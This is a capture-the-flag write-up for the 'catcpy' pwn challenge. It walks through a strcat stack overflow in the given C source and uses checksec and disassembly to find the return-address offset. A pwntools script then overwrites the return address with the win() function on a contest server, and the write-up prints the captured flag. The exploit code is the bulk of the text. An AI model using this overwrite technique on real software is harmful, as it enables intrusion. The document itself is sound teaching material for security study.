# catcpy : Pwn

`strcat` and `strcpy` are typical functions used in C textbooks.

Attachment  
[inbound.tar.gz](inbound.tar.gz)  

Tags : Buffer Overflow, Win Function  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char g_buf[0x100];

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

void get_data() {
  printf("Data: ");
  fgets(g_buf, sizeof(g_buf), stdin);
}

int main() {
  int choice;
  char buf[0x100];

  memset(buf, 0, sizeof(buf));
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  puts("1. strcpy\n" "2. strcat");
  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1) return 1;

    switch (choice) {
      case 1:
        get_data();
        strcpy(buf, g_buf);
        break;

      case 2:
        get_data();
        strcat(buf, g_buf);
        break;

      default:
        return 0;
    }
  }
}
```
This code reveals the existence of win().  
In addition, as `strcat` is being used, there is a buffer overflow vulnerability.  
`strcat` appends the string specified as the second argument to the end of the string specified as the first argument, and adds a null terminator.
```
$ checksec catcpy
[*] '/home/colza/catcpy'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
The apploach is as follows:
* As the `win` function is 3 bytes long, we must first fill the 6 bytes with nulls in order to overwrite the return address.
* Overwirte the return address to the `win` address.

The return address is located at `rbp+0x8`. And, buf is located at `rbp-0x110`. So, offset from buf to return address is `0x118`.
```
$ objdump -M intel -d catcpy
...
  4013cb:       48 8d 85 f0 fe ff ff    lea    rax,[rbp-0x110]
  4013d2:       48 8d 15 e7 2c 00 00    lea    rdx,[rip+0x2ce7]        # 4040c0 <g_buf>
  4013d9:       48 89 d6                mov    rsi,rdx
  4013dc:       48 89 c7                mov    rdi,rax
  4013df:       e8 6c fd ff ff          call   401150 <strcat@plt>
...
```

The steps are as follows:
 * fill the 3bytes, offset 0x11b-0x11d, with null
 * overwrite the return address to `win` address
 * call the `ret` instruction

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./catcpy")

p = remote("34.170.146.252", 49654)

for i in range(2):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", b"a"*0xff)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Data: ", b"a"*(0x19+0x4-i))


p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Data: ", b"a"*(0x17+0x4))
p.sendlineafter(b"> ", b"2")

win_addr = elf.symbols["win"]
payload = b"a" * (0x100-0x4) + p32(win_addr)[:3]

p.sendafter(b"Data: ", payload)

p.sendlineafter(b"> ", b"3")

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/catcpy'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 49654: Done
[*] Switching to interactive mode
Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 49654
[*] Got EOF while sending in interactive
```

Get the flag!

`Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}`
